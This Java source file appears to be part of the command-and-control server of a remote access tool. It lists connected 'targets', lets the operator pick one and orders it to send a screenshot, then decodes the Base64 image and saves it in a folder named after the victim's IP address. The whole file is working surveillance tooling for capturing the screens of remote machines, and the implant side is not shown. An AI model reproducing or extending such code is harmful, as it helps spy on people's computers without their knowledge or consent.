package com.company.screenshooter;

import com.company.clientList.ClientList;
import com.company.optionsPicker.OptionsPicker;
import com.company.printer.Colors;
import com.company.server.SocketServer;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;

@SuppressWarnings("ALL")
public class ScreenShoter {
    SocketServer.EchoClientHandler clientThread;

    public void doScreenShot() {
        if (ClientList.getInstance().handlerList.isEmpty()) {
            System.out.println("No targets connected!");
        } else {
            ClientList.showClients();
            getClient();
            clientThread.sendInstruction(1);
            receiveScreen();
        }
    }

    private void receiveScreen() {
        String encodedString = null;

        try {
            encodedString = clientThread.getIn().readLine();
        } catch (IOException e) {
            System.out.println(Colors.RED + "Connection error: Host disconnected from server." + Colors.RESET);
        }

        byte[] decodedBytes = Base64.getDecoder().decode(encodedString);

        String clientIP = clientThread.getClientSocket().getInetAddress().getHostAddress();
        String fileName = createFileName();

        saveScreenshot(clientIP, fileName, decodedBytes);

        System.out.println("Screenshot on " + clientThread.getPaintedIp() + " created successful. ");
    }

    private void saveScreenshot(String clientIP, String fileName, byte[] decodedBytes) {
        try {
            FileUtils.writeByteArrayToFile(new File("local/screenshots/" + clientIP + "/" + fileName + ".jpg"), decodedBytes);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String createFileName() {
        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        Date date = new Date();
        String dateString = dateFormat.format(date);
        dateString = dateString.replaceAll("/", "-");
        dateString = dateString.replaceAll(":", ";");
        return dateString;
    }

    private void getClient() {
        OptionsPicker picker = new OptionsPicker(ClientList.getInstance().handlerList.size());
        int targetNumber = picker.inputOption();

        clientThread = ClientList.getInstance().handlerList.get(targetNumber);
    }
}
